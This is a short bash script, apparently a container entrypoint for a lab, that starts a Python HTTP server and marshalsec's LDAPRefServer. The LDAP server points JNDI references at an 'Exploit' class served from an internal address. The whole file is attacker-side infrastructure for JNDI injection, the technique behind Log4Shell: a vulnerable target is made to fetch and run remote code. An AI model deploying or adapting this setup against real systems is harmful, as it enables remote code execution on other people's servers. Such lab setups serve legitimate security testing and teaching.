#!/bin/bash

# Start the first process
python3 -m http.server 8000 &
  
# Start the second process
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.3:8000/#Exploit" &
  
# Wait for any process to exit
wait -n
  
# Exit with status of process that exited first
exit $?

